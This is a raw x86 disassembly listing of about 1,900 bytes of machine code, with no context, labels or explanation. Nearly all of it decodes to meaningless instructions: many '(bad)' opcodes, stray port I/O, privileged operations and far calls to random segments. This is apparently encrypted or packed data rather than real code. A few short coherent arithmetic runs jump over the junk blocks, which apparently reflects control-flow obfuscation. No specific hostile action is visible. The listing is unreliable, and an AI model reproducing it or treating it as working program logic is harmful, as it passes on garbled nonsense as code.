  4113a4:	movhps xmm4,QWORD PTR [ecx+0x5b110765]
  4113ab:	dec    ecx
  4113ac:	lea    ebp,[si+0x7f]
  4113b0:	mov    BYTE PTR [esi],ch
  4113b2:	in     eax,dx
  4113b3:	sbb    al,BYTE PTR [ecx+0x21f91796]
  4113b9:	sbb    bl,BYTE PTR [eax-0x366a8774]
  4113bf:	mov    al,ds:0x4e6b71ad
  4113c4:	sar    BYTE PTR [ebp-0x79a09f44],cl
  4113ca:	cmc    
  4113cb:	xchg   ecx,eax
  4113cc:	(bad)
  4113cf:	push   es
  4113d0:	sbb    al,0xd9
  4113d2:	or     ebp,edx
  4113d4:	and    esi,DWORD PTR [eax-0x57f07cbd]
  4113da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113db:	lock pusha 
  4113dd:	test   DWORD PTR [edi],ebx
  4113df:	out    0x91,eax
  4113e1:	mov    dl,0x70
  4113e3:	retf   0x862f
  4113e6:	add    al,0x2f
  4113e8:	xchg   esi,eax
  4113e9:	in     eax,dx
  4113ea:	aad    0x8
  4113ec:	adc    dl,BYTE PTR [esi]
  4113ee:	and    DWORD PTR [ebx-0x4e2e3713],eax
  4113f4:	shl    BYTE PTR [edx-0x74925642],cl
  4113fa:	sbb    DWORD PTR [ebx],0x1dada50e
  411400:	outs   dx,BYTE PTR ds:[esi]
  411401:	sbb    eax,0x76e5fcba
  411406:	popa   
  411407:	add    BYTE PTR [ebx],0x1f
  41140a:	adc    eax,0xe9298e1b
  41140f:	ret    0x5eb7
  411412:	fst    QWORD PTR [ebp-0x7390de33]
  411418:	cli    
  411419:	lds    edx,FWORD PTR [ecx+eiz*4+0x56]
  41141d:	dec    ebp
  41141e:	xor    dh,dh
  411420:	fs inc eax
  411422:	push   ds
  411423:	or     BYTE PTR [ebx-0x56b75f69],dh
  411429:	clc    
  41142a:	sbb    al,0x50
  41142c:	mov    eax,0xd305ce0c
  411431:	mov    edx,0x8e89b30b
  411436:	nop
  411437:	mov    WORD PTR [ebx-0x2c],?
  41143a:	mov    ah,0x2b
  41143c:	sbb    BYTE PTR [edx+0x40],bh
  41143f:	lahf   
  411440:	stos   DWORD PTR es:[edi],eax
  411441:	(bad)  
  411442:	push   ebx
  411443:	mov    edi,0xabd59642
  411448:	loop   0x4114b5
  41144a:	call   0xca13:0x45fbdea
  411451:	push   ebp
  411452:	jno    0x41140b
  411454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411455:	ret    0xce35
  411458:	icebp  
  411459:	sbb    al,0x49
  41145b:	push   0x7e
  41145d:	mov    edx,0xb668f3f6
  411462:	(bad)  
  411463:	mov    bl,0x52
  411465:	sahf   
  411466:	jmp    0xb73e256d
  41146b:	ficom  DWORD PTR [edi]
  41146d:	scas   al,BYTE PTR es:[edi]
  41146e:	shr    BYTE PTR [edi],cl
  411470:	and    eax,0xa24ac8cc
  411475:	sbb    DWORD PTR [si],esi
  411478:	sti    
  411479:	(bad)  
  41147a:	leave  
  41147b:	cli    
  41147c:	mov    ch,0xe8
  41147e:	ret    0xbdf9
  411481:	jo     0x411405
  411483:	push   cs
  411484:	xchg   ebx,eax
  411485:	mov    bl,0xe2
  411487:	stos   DWORD PTR es:[edi],eax
  411488:	or     al,0xe3
  41148a:	test   BYTE PTR [edi+0xe755e01],0xf
  411491:	es mov edx,0xc29955a6
  411497:	call   0xb6c1:0xef53eb51
  41149e:	arpl   WORD PTR [eax+esi*1-0x62b59ce2],si
  4114a5:	fisttp WORD PTR [eax-0x3adf23be]
  4114ab:	and    cl,dh
  4114ad:	scas   al,BYTE PTR es:[edi]
  4114ae:	inc    edi
  4114af:	stc    
  4114b0:	out    dx,al
  4114b1:	xchg   edi,eax
  4114b2:	jg     0x41151c
  4114b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114b5:	push   ss
  4114b6:	xchg   edx,eax
  4114b7:	jns    0x411472
  4114b9:	cmp    BYTE PTR [ecx],bl
  4114bb:	cs xchg ah,al
  4114be:	or     dl,BYTE PTR [edi+eiz*8+0x695be19e]
  4114c5:	cmp    ch,BYTE PTR [ebx-0x2]
  4114c8:	cmp    edi,ecx
  4114ca:	test   eax,0x569f9364
  4114cf:	cli    
  4114d0:	or     ah,BYTE PTR [ebp-0x19]
  4114d3:	ja     0x411474
  4114d5:	mov    al,ds:0x71fe7f9e
  4114da:	ror    ah,1
  4114dc:	xor    ebx,DWORD PTR [edi+edx*4+0xa3bf6cd]
  4114e3:	lds    esp,FWORD PTR [ebx-0x34805e42]
  4114e9:	mov    gs,ecx
  4114eb:	and    DWORD PTR ds:0xf87d8b20,eax
  4114f1:	mov    ebx,DWORD PTR [ebp-0x10]
  4114f4:	sub    ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	(bad)  
  411510:	fisubr DWORD PTR [ecx]
  411512:	jl     0x4114d3
  411514:	pop    ebp
  411515:	js     0x41158f
  411517:	in     eax,0x7e
  411519:	js     0x411593
  41151b:	scas   eax,DWORD PTR es:[edi]
  41151c:	cdq    
  41151d:	push   ebx
  41151e:	xchg   ecx,eax
  41151f:	add    cl,BYTE PTR [esi]
  411521:	vmwrite ebp,DWORD PTR [ecx+edx*1]
  411525:	push   edx
  411526:	in     eax,dx
  411527:	and    dh,BYTE PTR [ebp+0x3b8c0dd1]
  41152d:	jbe    0x41152a
  41152f:	sub    al,0xfa
  411531:	loop   0x411502
  411533:	add    esp,ebp
  411535:	enter  0x33ba,0x51
  411539:	mov    ds:0x5e2f1207,al
  41153e:	inc    edx
  41153f:	add    BYTE PTR [ecx+ebx*4],al
  411542:	test   al,0x99
  411544:	bnd call 0xc49d88bd
  41154a:	jmp    FWORD PTR [esi+esi*2-0x39]
  41154e:	cs inc esp
  411550:	imul   edi,DWORD PTR [edx-0x40bab0a5],0xffffff84
  411557:	(bad)  
  411558:	push   ebp
  411559:	ins    DWORD PTR es:[edi],dx
  41155a:	sub    DWORD PTR [eax*4+0x14dc28d8],edi
  411561:	xchg   esi,eax
  411562:	imul   eax,ebp,0xffffff80
  411565:	pop    esi
  411566:	add    bl,dl
  411568:	jae    0x411567
  41156a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41156b:	and    BYTE PTR [edx],al
  41156d:	jecxz  0x4115bc
  41156f:	jecxz  0x4115cd
  411571:	push   esp
  411572:	in     eax,0x67
  411574:	iret   
  411575:	push   es
  411576:	lods   al,BYTE PTR ds:[esi]
  411577:	test   al,0x57
  411579:	stc    
  41157a:	lahf   
  41157b:	les    eax,FWORD PTR [ebp+0x4d]
  41157e:	ss cli 
  411580:	(bad)  
  411581:	or     ecx,DWORD PTR [esi+0x1]
  411584:	cli    
  411585:	inc    ebp
  411586:	mov    esi,0x857ee27b
  41158b:	enter  0x3ec7,0x8f
  41158f:	xor    BYTE PTR [edx-0x11],al
  411592:	aas    
  411593:	lods   al,BYTE PTR ds:[esi]
  411594:	or     eax,0xdf8ed905
  411599:	lahf   
  41159a:	iret   
  41159b:	in     al,dx
  41159c:	mov    edx,0x60dcd942
  4115a1:	jle    0x4115a7
  4115a3:	xchg   BYTE PTR [ebp+0x26],bl
  4115a6:	sbb    DWORD PTR [eax+edx*4-0x21],ecx
  4115aa:	(bad)  
  4115ab:	hlt    
  4115ac:	mov    dh,0x11
  4115ae:	xor    al,BYTE PTR [ebp+0x50225dac]
  4115b4:	adc    dh,BYTE PTR [esi+ebx*4-0x4f1a7b7e]
  4115bb:	pusha  
  4115bc:	ss jle 0x411631
  4115bf:	iret   
  4115c0:	test   eax,0xa4f03161
  4115c5:	stc    
  4115c6:	loop   0x4115b0
  4115c8:	clc    
  4115c9:	test   BYTE PTR [esi],ah
  4115cb:	xor    DWORD PTR [edx-0x6d18d999],esi
  4115d1:	and    al,0xa5
  4115d3:	pop    edi
  4115d4:	add    cl,BYTE PTR [edi]
  4115d6:	mov    ecx,0xdc98974d
  4115db:	or     al,0x9b
  4115dd:	stc    
  4115de:	in     eax,dx
  4115df:	cmp    ebp,edi
  4115e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115e2:	les    edi,FWORD PTR [edi]
  4115e4:	fidiv  WORD PTR [edx-0xb]
  4115e7:	jp     0x41164a
  4115e9:	pusha  
  4115ea:	or     eax,0xd8085e2b
  4115ef:	push   ebp
  4115f0:	pop    es
  4115f1:	cmc    
  4115f2:	stos   BYTE PTR es:[edi],al
  4115f3:	es adc eax,0x42f17e49
  4115f9:	fdiv   st,st(6)
  4115fb:	int3   
  4115fc:	push   esp
  4115fd:	into   
  4115fe:	or     ebx,esp
  411600:	aam    0x50
  411602:	outs   dx,DWORD PTR ds:[esi]
  411603:	hlt    
  411604:	(bad)  
  411605:	out    dx,eax
  411606:	int3   
  411607:	mov    bh,dh
  411609:	imul   edx,DWORD PTR [ecx-0x39],0xffffffc2
  41160d:	sbb    eax,0xf8485a84
  411612:	add    edi,edx
  411614:	sub    ecx,DWORD PTR [ecx]
  411616:	adc    cl,ch
  411618:	mov    eax,0xe09b0809
  41161d:	mov    DWORD PTR [ebp-0x40a2e134],edx
  411623:	add    BYTE PTR [eax-0x78],dl
  411626:	out    0xa9,al
  411628:	mov    es,WORD PTR [ebp+0x74552999]
  41162e:	push   ecx
  41162f:	xlat   BYTE PTR ds:[ebx]
  411630:	cmp    ebx,DWORD PTR [ebx+0x6d]
  411633:	mov    ch,0x61
  411635:	pop    ecx
  411636:	mov    edi,cs
  411638:	mov    ah,0x5d
  41163a:	xchg   edi,eax
  41163b:	addr16 (bad) 
  41163d:	fbstp  TBYTE PTR [edx]
  41163f:	retf   0x8450
  411642:	aas    
  411643:	pop    ds
  411644:	inc    esi
  411645:	aaa    
  411646:	das    
  411647:	add    eax,0xf85c5340
  41164c:	mov    esp,0x6913bff3
  411651:	scas   al,BYTE PTR es:[edi]
  411652:	and    cl,BYTE PTR [ecx-0x32]
  411655:	or     ch,BYTE PTR [esi+0x1c242c8b]
  41165b:	cld    
  41165c:	cmp    bh,ch
  41165e:	push   edi
  41165f:	dec    edx
  411660:	adc    ch,cl
  411662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411663:	and    al,0x61
  411665:	xchg   esp,eax
  411666:	mov    dl,0x69
  411668:	loop   0x4116c6
  41166a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41166b:	adc    esi,DWORD PTR [ebx-0x69a9c8a6]
  411671:	sbb    eax,0xf0c4123b
  411676:	cwde   
  411677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411678:	xor    al,0x45
  41167a:	push   edx
  41167b:	fcomp  st(4)
  41167d:	pushf  
  41167e:	outs   dx,DWORD PTR ds:[esi]
  41167f:	and    DWORD PTR [edx+0x5a],esp
  411682:	fsub   st,st(0)
  411684:	mov    bl,0x2b
  411686:	mov    esp,0x1a929ddd
  41168b:	mov    ah,0xb
  41168d:	in     al,0x25
  41168f:	sub    edx,esi
  411691:	mov    ch,0x41
  411693:	sbb    BYTE PTR [esi],dh
  411695:	iret   
  411696:	or     BYTE PTR [esi],0x63
  411699:	dec    ebx
  41169a:	cmp    ebx,DWORD PTR [esi]
  41169c:	inc    ebp
  41169d:	sub    DWORD PTR [ecx],edx
  41169f:	jae    0x41170e
  4116a1:	inc    esp
  4116a2:	mov    al,0xcb
  4116a4:	jle    0x41168e
  4116a6:	not    dl
  4116a8:	(bad)  
  4116a9:	hlt    
  4116aa:	adc    ecx,ebx
  4116ac:	xrelease xchg BYTE PTR [edi-0x50],bh
  4116b0:	fbstp  TBYTE PTR [edx-0x5317a80e]
  4116b6:	pop    ebx
  4116b7:	dec    edx
  4116b8:	pop    eax
  4116b9:	mov    BYTE PTR ds:0x81290775,ah
  4116bf:	or     edx,ebx
  4116c1:	int3   
  4116c2:	and    edi,DWORD PTR [ebx+0x61]
  4116c5:	xlat   BYTE PTR ds:[ebx]
  4116c6:	fstp   DWORD PTR ds:0x89d408e4
  4116cc:	aam    0x4c
  4116ce:	jmp    0x94e73615
  4116d3:	test   al,0x18
  4116d5:	jo     0x411729
  4116d7:	jp     0x4116a2
  4116d9:	jge    0x41167f
  4116db:	fbld   TBYTE PTR [eax-0x1225ad0b]
  4116e1:	jo     0x411735
  4116e3:	adc    eax,0xdb72d435
  4116e8:	icebp  
  4116e9:	inc    esi
  4116ea:	adc    bl,bh
  4116ec:	dec    eax
  4116ed:	aam    0xb3
  4116ef:	push   ebx
  4116f0:	push   ebp
  4116f1:	cmp    ebp,DWORD PTR [ebx-0x4120777]
  4116f7:	and    edx,ebx
  4116f9:	neg    BYTE PTR [ebx-0x3b]
  4116fc:	add    al,0x35
  4116fe:	test   ebx,edi
  411700:	mov    bh,0xd6
  411702:	pop    edx
  411703:	inc    esp
  411704:	sub    DWORD PTR [ecx-0x68],ebp
  411707:	inc    ebp
  411708:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411709:	xor    DWORD PTR cs:[eax+0x31135a3a],0x8e6e794f
  411714:	sbb    eax,0x4d436914
  411719:	pop    ebp
  41171a:	mov    ch,0xd8
  41171c:	cli    
  41171d:	inc    ecx
  41171e:	daa    
  41171f:	nop
  411720:	(bad)  
  411721:	mov    bh,0xb6
  411723:	cmp    DWORD PTR [edi+0x2356b353],esp
  411729:	(bad)  
  41172b:	in     eax,0xf0
  41172d:	sbb    eax,0x2a9a3e88
  411732:	push   ss
  411733:	das    
  411734:	pop    edx
  411735:	push   esi
  411736:	clc    
  411737:	lods   eax,DWORD PTR ds:[esi]
  411738:	rol    BYTE PTR [edx+esi*8],cl
  41173b:	scas   al,BYTE PTR es:[edi]
  41173c:	ins    DWORD PTR es:[edi],dx
  41173d:	inc    esp
  41173e:	xor    ebp,0x495e9cc2
  411744:	ret    0x3ec4
  411747:	push   ds
  411748:	jge    0x4117a1
  41174a:	adc    BYTE PTR [ecx],bh
  41174c:	push   0x40
  41174e:	xor    al,0xf9
  411750:	sub    cl,BYTE PTR [esi]
  411752:	add    esi,edi
  411754:	iret   
  411755:	sti    
  411756:	loopne 0x4116e5
  411758:	mov    ecx,0x371c81aa
  41175d:	mov    ebp,0xbad45f78
  411762:	jno    0x411720
  411764:	push   ss
  411765:	sub    esp,DWORD PTR [edi]
  411767:	push   es
  411768:	jp     0x41177e
  41176a:	fld    TBYTE PTR [ebx+0x612e2e37]
  411770:	arpl   si,bp
  411772:	test   DWORD PTR [ecx-0xa522ccf],esp
  411778:	out    dx,eax
  411779:	sbb    DWORD PTR [esi],ebx
  41177b:	push   ds
  41177c:	xchg   ebp,eax
  41177d:	je     0x411740
  41177f:	into   
  411780:	icebp  
  411781:	pop    esp
  411782:	lods   al,BYTE PTR ds:[esi]
  411783:	fld    TBYTE PTR [eax]
  411785:	or     DWORD PTR [ebx-0x17162fab],0x7
  41178c:	add    BYTE PTR [eax],al
  41178e:	mov    edx,DWORD PTR [ebp-0x38]
  411791:	mov    edi,DWORD PTR [ebp-0x4]
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	push   ss
  4117b4:	stos   BYTE PTR es:[edi],al
  4117b5:	mov    dl,0x81
  4117b7:	and    al,0x62
  4117b9:	js     0x411833
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	leave  
  4117c0:	pushf  
  4117c1:	cs jo  0x4117ef
  4117c4:	and    BYTE PTR [edi+0x55b5b122],ch
  4117ca:	xchg   ecx,eax
  4117cb:	fldenv [ebx-0x1026925d]
  4117d1:	ret    0x3f80
  4117d4:	mov    dh,BYTE PTR [esi-0x17c36326]
  4117da:	pop    esp
  4117db:	cvtps2pd xmm1,QWORD PTR [ebx]
  4117de:	xor    al,0xea
  4117e0:	xchg   ebp,edx
  4117e2:	aas    
  4117e3:	es mov cl,0xfd
  4117e6:	xchg   esp,eax
  4117e7:	cli    
  4117e8:	es and eax,0x50cbb8d4
  4117ee:	aas    
  4117ef:	leave  
  4117f0:	ficomp WORD PTR [edi]
  4117f2:	push   ds
  4117f3:	shr    dl,0xef
  4117f6:	xchg   esp,eax
  4117f7:	loop   0x411782
  4117f9:	test   eax,0xb339a3f2
  4117fe:	or     esp,eax
  411800:	mov    dh,0x95
  411802:	mov    esi,0x7b00a22d
  411807:	cmp    BYTE PTR [edx+0x27a68cf9],dl
  41180d:	shr    BYTE PTR [edx+0x10],cl
  411810:	jecxz  0x4117ae
  411812:	call   0x605b4fb
  411817:	adc    BYTE PTR [edx],dh
  411819:	jle    0x4117c2
  41181b:	sub    BYTE PTR [edx],cl
  41181d:	xchg   ebp,eax
  41181e:	rol    BYTE PTR [eax],cl
  411820:	sub    al,0x63
  411822:	inc    edi
  411823:	xor    DWORD PTR ds:0xde96f442,ecx
  411829:	cld    
  41182a:	xchg   ebx,eax
  41182b:	cld    
  41182c:	sbb    edx,DWORD PTR [edx+0x4]
  41182f:	rol    DWORD PTR [edi+0xc63d64],0x6e
  411836:	inc    eax
  411837:	xchg   BYTE PTR [ebx-0x3a],ch
  41183a:	sub    ebp,DWORD PTR [edi]
  41183c:	push   eax
  41183d:	pop    edx
  41183e:	xchg   ebx,eax
  41183f:	retf   0xe0bd
  411842:	add    al,BYTE PTR [esi+0x3b]
  411845:	mov    al,0xe2
  411847:	mov    esp,0x58b65835
  41184c:	pop    esp
  41184d:	and    BYTE PTR [ebp+0x3c],dh
  411850:	mov    ebx,esp
  411852:	ins    DWORD PTR es:[edi],dx
  411853:	mov    dh,0x67
  411855:	hlt    
  411856:	jno    0x411853
  411858:	inc    ebp
  411859:	jl     0x41189a
  41185b:	(bad)  
  41185d:	pop    ebx
  41185e:	xchg   esp,eax
  41185f:	jmp    0x5418:0xd13b5952
  411866:	add    ch,BYTE PTR [ebx+0x3ea7f9f7]
  41186c:	iret   
  41186d:	jmp    0x4118b3
  41186f:	mov    esp,0x74125014
  411874:	adc    ebp,DWORD PTR [eax]
  411876:	imul   ecx,DWORD PTR [edx],0x91088ac8
  41187c:	inc    edx
  41187d:	scas   eax,DWORD PTR es:[edi]
  41187e:	dec    ebx
  41187f:	mov    dl,dh
  411881:	jmp    0x4118ba
  411883:	adc    ebx,esi
  411885:	aas    
  411886:	repz inc esi
  411888:	stos   DWORD PTR es:[edi],eax
  411889:	jnp    0x411906
  41188b:	cmp    DWORD PTR [ebp+esi*8-0x1b74fcb5],ecx
  411892:	dec    eax
  411893:	retf   0x9b0e
  411896:	nop
  411897:	mov    esp,DWORD PTR [eax-0x420df887]
  41189d:	or     ah,BYTE PTR [ebx+0x7cbf516d]
  4118a3:	(bad)  
  4118a4:	xor    DWORD PTR [edi+eiz*2+0x1e],esi
  4118a8:	sbb    DWORD PTR [ecx+0x26],ebp
  4118ab:	inc    edx
  4118ac:	into   
  4118ad:	(bad)  
  4118ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118af:	cmp    eax,0x23201ddb
  4118b4:	dec    ebp
  4118b5:	and    eax,0xfb96df98
  4118ba:	loopne 0x41185a
  4118bc:	in     al,dx
  4118bd:	xor    edx,eax
  4118bf:	and    al,0x73
  4118c1:	gs (bad) ss:[ebx]
  4118c5:	or     BYTE PTR [esi-0x73],al
  4118c8:	adc    cl,dh
  4118ca:	pusha  
  4118cb:	mov    esp,0x1329df79
  4118d0:	mov    edi,0xbcc6a7db
  4118d5:	int3   
  4118d6:	lods   al,BYTE PTR ds:[esi]
  4118d7:	out    0x84,al
  4118d9:	scas   eax,DWORD PTR es:[edi]
  4118da:	dec    edi
  4118db:	icebp  
  4118dc:	jl     0x41192d
  4118de:	js     0x411913
  4118e0:	inc    eax
  4118e1:	(bad)  
  4118e2:	loope  0x4118ab
  4118e4:	and    al,0x26
  4118e6:	fbld   TBYTE PTR [esi-0x6b]
  4118e9:	cmp    eax,0x59ba47ab
  4118ee:	push   esp
  4118ef:	popf   
  4118f0:	push   ds
  4118f1:	ins    DWORD PTR es:[edi],dx
  4118f2:	nop
  4118f3:	je     0x41196c
  4118f5:	stc    
  4118f6:	mov    ebp,0x1d0b851a
  4118fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118fc:	popa   
  4118fd:	rcl    DWORD PTR [esi],cl
  4118ff:	ja     0x411925
  411901:	inc    edx
  411902:	xchg   esi,eax
  411903:	call   0x6cbf81fe
  411908:	sub    edx,DWORD PTR [eax+0xe]
  41190b:	pop    ds
  41190c:	cli    
  41190d:	nop
  41190e:	test   BYTE PTR [ebx],bh
  411910:	pop    es
  411911:	add    al,0xc2
  411913:	shr    DWORD PTR [esi-0x64],1
  411916:	call   0x3b7e:0x2a815167
  41191d:	(bad)  
  41191e:	iret   
  41191f:	dec    edx
  411920:	into   
  411921:	fild   WORD PTR [esi*1-0x794bc00d]
  411928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411929:	and    BYTE PTR [edx+0x4e2a3260],bh
  41192f:	jmp    0xc836:0xb6910d14
  411936:	mov    WORD PTR [ecx-0x78],fs
  411939:	jle    0x41193e
  41193b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41193c:	pop    edx
  41193d:	sar    DWORD PTR [edi],cl
  41193f:	fcmovb st,st(3)
  411941:	lds    eax,FWORD PTR [eax-0x4]
  411944:	adc    DWORD PTR [ebx],edi
  411946:	jno    0x41199a
  411948:	test   eax,0x12278d07
  41194d:	dec    edx
  41194e:	mov    BYTE PTR [ebp-0x13],ch
  411951:	sahf   
  411952:	enter  0x1db4,0x2
  411956:	or     DWORD PTR [ecx+0x1],ebx
  411959:	pushf  
  41195a:	outs   dx,BYTE PTR ds:[esi]
  41195b:	or     eax,0xc2693451
  411960:	mov    ch,0xa3
  411962:	call   0x44f:0xaef6f7a
  411969:	xlat   BYTE PTR ds:[ebx]
  41196a:	cmp    dl,BYTE PTR [esi+ebx*2-0x36]
  41196e:	lods   eax,DWORD PTR ds:[esi]
  41196f:	xor    eax,0x4a65b154
  411974:	in     al,dx
  411975:	lds    ebx,FWORD PTR [ebp+edx*4+0x2f659fbd]
  41197c:	out    dx,eax
  41197d:	or     DWORD PTR ds:0x7d69c466,ecx
  411983:	xchg   ecx,eax
  411984:	inc    eax
  411985:	cmp    al,0x9a
  411987:	mov    bh,0xcc
  411989:	adc    BYTE PTR [ebp+edx*8+0x4c8d1c26],bh
  411990:	in     eax,dx
  411991:	outs   dx,DWORD PTR ds:[esi]
  411992:	test   al,0x77
  411994:	ret    0x393b
  411997:	shl    BYTE PTR [esi],0x9c
  41199a:	loope  0x4119be
  41199c:	ss ja  0x4119b4
  41199f:	dec    BYTE PTR [edi-0x6d7c94af]
  4119a5:	pop    ds
  4119a6:	out    0x32,eax
  4119a8:	(bad)  
  4119a9:	(bad)  
  4119aa:	push   cs
  4119ab:	xchg   ebx,eax
  4119ac:	mov    eax,ebp
  4119ae:	cmp    DWORD PTR es:[esi+eax*8-0x309ca9],ebx
  4119b6:	adc    al,0x3f
  4119b8:	rdmsr  
  4119ba:	in     al,0x1e
  4119bc:	jge    0x41197f
  4119be:	pop    ds
  4119bf:	ror    DWORD PTR [esi+edx*2+0x2f],cl
  4119c3:	enter  0x1e1f,0xc2
  4119c7:	xchg   ebp,eax
  4119c8:	out    0x56,eax
  4119ca:	retf   
  4119cb:	xor    BYTE PTR [ebx],bl
  4119cd:	sysexit 
  4119cf:	call   0xaca0:0x9d900c49
  4119d6:	call   0x97c9:0x1a32e930
  4119dd:	fidivr DWORD PTR [eax+0xd92518b]
  4119e3:	push   esp
  4119e4:	adc    bh,BYTE PTR ds:0x3b064440
  4119ea:	add    DWORD PTR [eax+0xc],ebp
  4119ed:	dec    esi
  4119ee:	mov    dl,0x20
  4119f0:	xchg   ebx,eax
  4119f1:	inc    eax
  4119f2:	push   edx
  4119f3:	stos   BYTE PTR es:[edi],al
  4119f4:	in     al,dx
  4119f5:	cmp    bh,0xed
  4119f8:	mov    esi,0x2650f107
  4119fd:	dec    ebx
  4119fe:	dec    esp
  4119ff:	mov    cl,0x7e
  411a01:	or     al,BYTE PTR [esp+ebp*8+0x32]
  411a05:	(bad)  
  411a06:	in     al,0xbf
  411a08:	xor    edx,DWORD PTR [edi]
  411a0a:	loop   0x4119e1
  411a0c:	mov    ecx,0x47a92300
  411a11:	and    DWORD PTR [edx+0x72],ecx
  411a14:	push   es
  411a15:	fiadd  WORD PTR [ecx-0x39]
  411a18:	cwde   
  411a19:	cs sti 
  411a1b:	add    BYTE PTR [ebx-0x35b9a9ef],cl
  411a21:	ret    
  411a22:	repnz in eax,0x38
  411a25:	out    0x8c,al
  411a27:	jl     0x411a69
  411a29:	ror    DWORD PTR [ebx-0x20d40fa3],0x3b
  411a30:	fimul  DWORD PTR [edi]
  411a32:	xchg   DWORD PTR [eax],ecx
  411a34:	add    BYTE PTR [eax],al
  411a36:	add    BYTE PTR [ebx+0x37e9cc55],cl
  411a3c:	add    eax,0x558b0000
  411a41:	les    ecx,FWORD PTR [ebx-0x2fcc0383]
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0xffd7da8b
  411a62:	in     eax,dx
  411a63:	pop    ebx
  411a64:	dec    edx
  411a65:	xchg   ecx,eax
  411a66:	pusha  
  411a67:	js     0x411ae1
  411a69:	in     eax,0x7e
  411a6b:	js     0x411ae5
  411a6d:	ja     0x411a3c
  411a6f:	pop    ebx
  411a70:	cmc    
  411a71:	ret    0x4581
  411a74:	push   ebp
  411a75:	test   bl,al
  411a77:	pusha  
  411a78:	cmc    
  411a79:	in     eax,0x5e
  411a7b:	mov    ebp,0x5a268a24
  411a80:	sbb    esi,DWORD PTR [edx+0x6d1b7b5d]
  411a86:	sbb    bh,BYTE PTR [ebx+edi*2-0x63]
  411a8a:	psrlq  mm5,QWORD PTR [ebx+ecx*1-0x16770aa6]
  411a92:	adc    bh,BYTE PTR [eax+0x41]
  411a95:	stc    
  411a96:	retf   0xa008
  411a99:	mov    edi,0xe44f8938
  411a9e:	add    dh,cl
  411aa0:	sbb    BYTE PTR [ebp+0x79],bh
  411aa3:	push   ss
  411aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aa5:	jmp    0x411af6
  411aa7:	add    DWORD PTR es:[edx],edx
  411aaa:	jp     0x411a5f
  411aac:	ja     0x411a71
  411aae:	pop    esi
  411aaf:	jmp    0x144f:0x685f8664
  411ab6:	fimul  DWORD PTR [edi+0x32a1e378]
  411abc:	and    al,0x1d
  411abe:	lds    ecx,FWORD PTR [ecx+edi*2]
  411ac1:	pop    ecx
  411ac2:	mov    WORD PTR [esi-0x13],?
  411ac5:	adc    esp,DWORD PTR [ecx+ebx*1-0x5c07e2ae]
  411acc:	scas   al,BYTE PTR es:[edi]
  411acd:	pusha  
  411ace:	xor    edi,DWORD PTR [eax-0x5b492ae2]
  411ad4:	sub    al,0x38
  411ad6:	mov    cl,0x3
  411ad8:	push   ebp
  411ad9:	xor    edi,edi
  411adb:	stos   DWORD PTR es:[edi],eax
  411adc:	pushf  
  411add:	and    DWORD PTR [esi-0x6cf67320],ebp
  411ae3:	add    esp,ecx
  411ae5:	in     al,0x4d
  411ae7:	scas   eax,DWORD PTR es:[edi]
  411ae8:	sbb    edi,0x7017d37a
  411aee:	into   
  411aef:	loop   0x411b12
  411af1:	add    eax,0xbe6058fe
  411af6:	jp     0x411b59
  411af8:	lea    edi,[esp+esi*8]
  411afb:	jge    0x411b32
  411afd:	leave  
  411afe:	das    
  411aff:	add    BYTE PTR [esi],dh
  411b01:	(bad)  
  411b02:	cli    
  411b03:	cld    
  411b04:	push   es
  411b05:	mov    al,0xeb
  411b07:	popa   
  411b08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b09:	call   0x96f2:0xd33de41a
  411b10:	pop    eax
  411b11:	sbb    esi,DWORD PTR [ecx-0xbe3ddee]
  411b17:	mov    dh,BYTE PTR [ecx+0x3]
  411b1a:	sti    
  411b1b:	data16 arpl WORD PTR [edx+0x3d3ff42c],cx
  411b22:	rcr    DWORD PTR [edx-0x166eff39],1
  411b28:	or     DWORD PTR [ebx-0x65],eax
  411b2b:	test   al,0x40
  411b2d:	pop    ecx
  411b2e:	(bad)  
  411b2f:	sbb    al,0x12
  411b31:	pop    ds
  411b32:	ror    DWORD PTR [edx],cl
  411b34:	push   ss
  411b35:	mov    cl,0x8a
  411b37:	into   
  411b38:	gs mov bh,0x42
  411b3b:	fild   DWORD PTR [ebx+0x66]
  411b3e:	out    0x27,al
  411b40:	push   ds
  411b41:	add    al,BYTE PTR [edi-0x2930308]
  411b47:	in     eax,dx
  411b48:	sbb    DWORD PTR [ebx+0x29],edi
  411b4b:	(bad)  
  411b4c:	mov    edx,0x9cdb4ae6
  411b51:	(bad)  
  411b52:	mov    ah,0x48
  411b54:	jmp    0xc996:0x73556e61
  411b5b:	xchg   esi,eax
  411b5c:	add    DWORD PTR [esi-0x5ae0027],edi
  411b62:	pop    ds
